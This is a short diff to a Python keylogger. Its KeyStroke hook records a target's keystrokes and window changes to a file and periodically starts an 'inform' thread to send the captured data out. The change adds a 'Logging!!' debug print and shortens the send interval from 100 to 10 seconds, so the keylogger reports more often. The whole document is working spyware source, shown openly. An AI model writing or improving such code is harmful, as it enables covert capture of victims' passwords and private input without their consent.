@@ -53,6 +53,7 @@ def KeyStroke(event):
         global current_window
         global st_time
     # check to see if target changed windows
+        print "\nLogging!!"
 	if event.WindowName != current_window:
 	   current_window = event.WindowName
 	   get_current_process()
@@ -83,7 +84,7 @@ def KeyStroke(event):
 		   f_des.close()
 	# pass execution to the next registered hook
 	
-            if (time.time() - st_time > 100):
+            if (time.time() - st_time > 10):
 	             print "Sending >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
                      st_time = time.time()
                      thread_i = threading.Thread(target=inform)
